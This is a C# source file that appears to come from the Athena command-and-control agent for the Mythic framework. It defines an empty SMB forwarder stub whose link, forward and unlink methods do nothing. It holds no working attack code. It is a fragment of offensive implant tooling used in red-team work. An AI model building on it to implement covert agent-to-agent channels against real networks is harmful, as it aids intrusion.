﻿using Athena.Models.Config;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Comms.SMB;
using Athena.Models.Responses;
using Athena.Utilities;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Forwarders
{
    public class Forwarder : IForwarder
    {
        public bool connected { get; set; }
        public ConcurrentBag<DelegateMessage> messageOut { get; set; }

        public string profile_type => "empty";

        public Forwarder()
        {
        }

        public async Task<List<DelegateMessage>> GetMessages()
        {
            return new List<DelegateMessage>();
        }

        //Link to the Athena SMB Agent
        public async Task<bool> Link(MythicJob job, string uuid)
        {
            return false; 
        }
        public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
        {
            return false;
        }

        //Unlink from the named pipe
        public async Task<bool> Unlink()
        {
            return false;
        }

        Task<EdgeResponseResult> IForwarder.Link(MythicJob job, string uuid)
        {
            throw new NotImplementedException();
        }
    }
}
